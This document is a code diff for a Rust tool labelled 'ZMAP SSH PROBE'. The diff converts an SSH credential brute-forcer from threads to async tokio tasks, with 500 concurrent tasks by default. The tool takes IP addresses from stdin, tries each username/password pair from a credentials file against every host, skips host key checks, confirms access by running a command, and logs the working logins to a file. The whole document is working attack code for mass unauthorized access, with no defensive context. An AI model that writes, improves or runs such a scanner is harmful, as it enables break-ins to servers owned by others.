@@ -1,15 +1,15 @@
-use ssh2::Session;
+use async_ssh2_tokio::client::{Client, AuthMethod, ServerCheckMethod};
 use std::io::{self, BufRead, Write, BufWriter};
 use std::fs::OpenOptions;
-use std::net;
-use std::sync::mpsc;
-use std::time::Duration;
+use tokio::sync::mpsc;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use colored::*; 
 use clap::Parser;
-use std::io::Read;
-use std::thread;
-use std::sync::{Arc, Mutex};
+use tokio::io::{AsyncBufReadExt, BufReader};
+use std::sync::Arc;
+use tokio::sync::Mutex;
+use tokio::time::{timeout, Duration};
+
 
 static IMPORTED: AtomicUsize = AtomicUsize::new(0);
 static CHECKED: AtomicUsize = AtomicUsize::new(0);
@@ -30,23 +30,30 @@ struct Args {
     output_file: String,
 
     /// Specifies the number of threads to use
-    #[arg(short = 't', long, default_value = "50")]
+    #[arg(short = 't', long, default_value = "500")]
     threads: usize,
+
+    /// Specifies the timeout in seconds for each SSH check
+    #[arg(short = 's', long, default_value = "5")]
+    timeout: u64,
 }
 
-fn main() {
+
+#[tokio::main]
+async fn main() {
     let args = Args::parse();
 
-    let (ip_tx, ip_rx) = mpsc::channel();
-    let ip_rx = Arc::new(Mutex::new(ip_rx));
-       
-    thread::spawn(|| {
+    // Create mpsc channel
+    let (ip_tx, ip_rx) = mpsc::channel(args.threads);
+    let shared_rx = Arc::new(Mutex::new(ip_rx));
+
+    tokio::task::spawn(async {
         println!("+-------------------------------------------+");
         println!("|             ZMAP SSH PROBE                |");
         println!("+-------------------------------------------+");
-        
+
         loop {
-            thread::sleep(Duration::new(1, 0)); // Sleep for one second
+            tokio::time::sleep(Duration::from_secs(1)).await;
 
             // Read the atomic values
             let imported_count = IMPORTED.load(Ordering::Relaxed);
@@ -69,126 +76,96 @@ fn main() {
         }
     });
 
-    thread::spawn(move || {
-        let stdin = io::stdin();
-        for line in stdin.lock().lines() {
-            let ip = line.expect("Failed to read line");
-            ip_tx.send(ip).unwrap();
+    tokio::task::spawn(async move {
+        let stdin = tokio::io::stdin();
+        let mut reader = BufReader::new(stdin).lines();
+
+        while let Ok(Some(line)) = reader.next_line().await {
+            ip_tx.send(line).await.expect("Failed to send IP");
             IMPORTED.fetch_add(1, Ordering::Relaxed);
+        }
+
+        if let Err(e) = reader.next_line().await {
+            eprintln!("Failed to read line: {}", e);
         }
     });
 
     let credentials = load_credentials_file("credentials.txt");
-    const STACK_SIZE: usize = 8 * 1024 * 1024; // 8MB
 
     let handles: Vec<_> = (0..args.threads).map(|_| {
-        let ip_rx = Arc::clone(&ip_rx);
+        let shared_rx = shared_rx.clone();
         let creds = credentials.clone();
         let output_file = args.output_file.clone();
-    
-        std::thread::Builder::new().stack_size(STACK_SIZE).spawn(move || {
+        let ssh_check_timeout = Duration::from_secs(args.timeout);
+
+        tokio::task::spawn(async move {
             loop {
-                let ip;
-                {
-                    let receiver = ip_rx.lock().unwrap();
-                    ip = receiver.recv();
-                }
-    
-                match ip {
-                    Ok(ip) => check_ssh_login(ip, args.port, creds.clone(), &output_file),
-                    Err(_) => break, // Break loop when no more IPs
+                let ip_option = {
+                    let mut locked_rx = shared_rx.lock().await;
+                    locked_rx.recv().await
+                };
+
+                if let Some(ip) = ip_option {
+                    check_ssh_login(ip, args.port, creds.clone(), &output_file, ssh_check_timeout).await;
+                } else {
+                    break; // Exit loop if the channel is closed and all messages are received
                 }
             }
-        }).unwrap()
+        })
     }).collect();
 
-    // Wait for all threads to finish
+    // Wait for all tasks to finish
     for handle in handles {
-        handle.join().unwrap();
+        handle.await.unwrap();
     }
 }
 
-fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str) {
-    let timeout = 5_000; // milliseconds
+async fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, output_file: &str, timeout_duration: Duration) {
     CHECKED.fetch_add(1, Ordering::Relaxed);
 
-    let tcp_stream_result = net::TcpStream::connect((ip.as_str(), port));
+    for (username, password) in &credentials {
+        let auth_method = AuthMethod::with_password(password);
+        
+        let timed_result = timeout(timeout_duration, Client::connect(
+            (ip.as_str(), port),
+            username,
+            auth_method.clone(),
+            ServerCheckMethod::NoCheck,
+        )).await;
 
-    match tcp_stream_result {
-        Ok(tcp_stream) => {
-            let mut session = match Session::new() {
-                Ok(session) => session,
-                Err(_) => {
-                    FAILED.fetch_add(1, Ordering::Relaxed);
-                    return;
-                }
-            };
-
-            session.set_tcp_stream(tcp_stream);
-            session.set_timeout(timeout);
-
-            if session.handshake().is_err() {
-                FAILED.fetch_add(1, Ordering::Relaxed);
-                return;
-            }
-
-            for (username, password) in &credentials {
-                COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
-
-                if session.userauth_password(username, password).is_ok() {
-                    let mut channel = match session.channel_session() {
-                        Ok(channel) => channel,
-                        Err(_) => {
+        match timed_result {
+            Ok(result) => match result {
+                Ok(client) => {
+                    COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
+                    let exec_result = client.execute("echo .").await;
+                    
+                    if let Ok(res) = exec_result {
+                        if res.exit_status == 0 {
+                            write_successful_login_to_file(output_file, &ip, username, password);
+                            SUCCESS.fetch_add(1, Ordering::Relaxed);
+                            break;  // Exit if a successful login is found.
+                        } else {
                             FAILED.fetch_add(1, Ordering::Relaxed);
-                            continue;
                         }
-                    };
-
-                    if channel.exec("echo '.'").is_err() {
-                        FAILED.fetch_add(1, Ordering::Relaxed);
-                        continue;
-                    }
-
-                    // Read any potential output from the command
-                    let mut output = String::new();
-                    if let Err(_e) = channel.read_to_string(&mut output) {
-                        //println!! ("Error reading output for IP {} with username {}: {}", ip, username, e);
-                    }
-
-                    // Send EOF if needed
-                    channel.send_eof().unwrap_or_default();
-
-                    // Now, try to close the channel
-                    if let Err(_e) = channel.wait_close() {
-                        //println!! ("Channel close error for IP {} with username {}: {}", ip, username, e);
-                        FAILED.fetch_add(1, Ordering::Relaxed);
-                        continue;
-                    }
-
-                    if channel.exit_status().unwrap_or(-1) == 0 {
-                        session.disconnect(None, "Closing session", None).unwrap_or_default();
-                        write_successful_login_to_file(output_file, &ip, username, password);
-                        SUCCESS.fetch_add(1, Ordering::Relaxed);
-                        break;
                     } else {
                         FAILED.fetch_add(1, Ordering::Relaxed);
                     }
-                } else {
-                    FAILED.fetch_add(1, Ordering::Relaxed);
+                },
+                Err(e) => {
+                    if e.to_string().contains("timeout") {
+                        TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+                    } else {
+                        FAILED.fetch_add(1, Ordering::Relaxed);
+                    }
                 }
-            }
-        },
-        Err(e) => {
-            if e.to_string().contains("timeout") {
+            },
+            Err(_) => {
+                // This block handles the case where our manual timeout has been reached
                 TIMEOUTS.fetch_add(1, Ordering::Relaxed);
-            } else {
-                FAILED.fetch_add(1, Ordering::Relaxed);
             }
         }
     }
 }
-
-
 
 fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
     let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
